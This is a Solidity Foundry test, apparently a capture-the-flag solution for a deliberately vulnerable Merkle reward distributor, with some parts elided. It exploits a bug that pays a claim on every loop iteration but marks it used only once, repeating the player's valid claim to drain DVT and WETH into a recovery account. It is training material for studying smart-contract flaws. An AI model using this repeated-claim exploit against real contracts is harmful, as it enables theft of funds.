...
contract TheRewarderChallenge is Test {
    ...
    function test_theRewarder() public checkSolvedByPlayer {
        // The player is one of the 1000 beneficiaries. The bug: in claimRewards
        // the transfer runs on EVERY loop iteration, but _setClaimed (which marks
        // the bitmap and decrements `remaining`) only fires when the token changes
        // or on the last claim. So repeating the SAME valid claim many times,
        // grouped per token, pays out N times while only being marked once.
        Reward[] memory dvtRewards = _readRewards("/test/the-rewarder/dvt-distribution.json");
        Reward[] memory wethRewards = _readRewards("/test/the-rewarder/weth-distribution.json");

        (uint256 dvtIndex, uint256 dvtAmount) = _findPlayer(dvtRewards);
        (uint256 wethIndex, uint256 wethAmount) = _findPlayer(wethRewards);

        bytes32[] memory dvtProof = merkle.getProof(_toLeaves(dvtRewards), dvtIndex);
        bytes32[] memory wethProof = merkle.getProof(_toLeaves(wethRewards), wethIndex);

        // Floor division => never underflow `remaining` in _setClaimed; leaves dust.
        ...
        for (uint256 i = 0; i < wethRepeat; i++) {
            claims[dvtRepeat + i] = Claim({batchNumber: 0, amount: wethAmount, tokenIndex: 1, proof: wethProof});
        }

        distributor.claimRewards(claims, tokens);

        // Sweep the drained rewards to the recovery account.
        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));
    }

    function _readRewards(string memory path) private view returns (Reward[] memory) {
        return abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]));
    }

    function _toLeaves(Reward[] memory rewards) private pure returns (bytes32[] memory leaves) {
        leaves = new bytes32[](rewards.length);
        for (uint256 i = 0; i < rewards.length; i++) {
            leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
        }
    }

    function _findPlayer(Reward[] memory rewards) private view returns (uint256 index, uint256 amount) {
        for (uint256 i = 0; i < rewards.length; i++) {
            if (rewards[i].beneficiary == player) return (i, rewards[i].amount);
        }
        revert("player not in distribution");
    }
